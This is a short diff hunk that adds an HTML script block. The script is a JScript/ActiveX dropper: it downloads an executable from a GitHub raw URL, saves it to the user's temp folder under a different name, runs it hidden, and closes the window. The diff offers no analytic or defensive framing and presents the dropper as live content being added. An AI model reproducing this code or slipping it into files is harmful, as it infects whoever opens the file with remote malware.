@@ -1,0 +1,11 @@
+<script>
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cingenlerkordi-art/dd/refs/heads/main/cgxn2.exe",false);
+x.send();
+var sh=new ActiveXObject("WScript.Shell");
+var f=sh.ExpandEnvironmentStrings("%TEMP%")+"\\wln.exe";
+var s=new ActiveXObject("ADODB.Stream");
+s.Type=1;s.Open();s.Write(x.responseBody);s.SaveToFile(f,2);
+sh.Run(f,0,false);
+window.close();
+</script>
